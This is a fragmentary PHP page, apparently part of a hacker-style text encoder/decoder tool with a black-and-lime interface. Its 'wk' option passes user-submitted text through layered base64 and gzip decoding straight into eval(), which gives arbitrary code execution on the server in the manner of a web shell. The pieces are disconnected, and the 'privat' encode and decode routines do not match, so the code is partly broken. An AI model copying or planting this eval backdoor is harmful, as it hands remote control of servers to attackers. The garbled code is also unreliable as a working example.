...
BODY {margin-top: 1px;margin-right: 1px;margin-bottom: 1px;margin-left: 1px;SCROLLBAR-FACE-COLOR: blue; SCROLLBAR-HIGHLIGHT-COLOR: #111111;SCROLLBAR-ARROW-COLOR: #c5c5c5;SCROLLBAR-BASE-COLOR: white;BACKGROUND-COLOR: black;}
</STYLE>
<center>
<BR>
...
<option value="privat">gzcompress - base64</option>
...
break;case 'privat' :
$codi=gzcompress(base64_encode($text));
break;default:break;}}
...
break;case 'privat' :
$codi=gzuncompress(base64_decode($text));
break;case 'wk' :
$codi=eval(base64_decode(gzuncompress(base64_decode($text))));
break;default:break;
}
echo "<textarea cols=80 rows=10 style=background:black;color:lime>$codi</textarea></center><br><br>";
}
?>
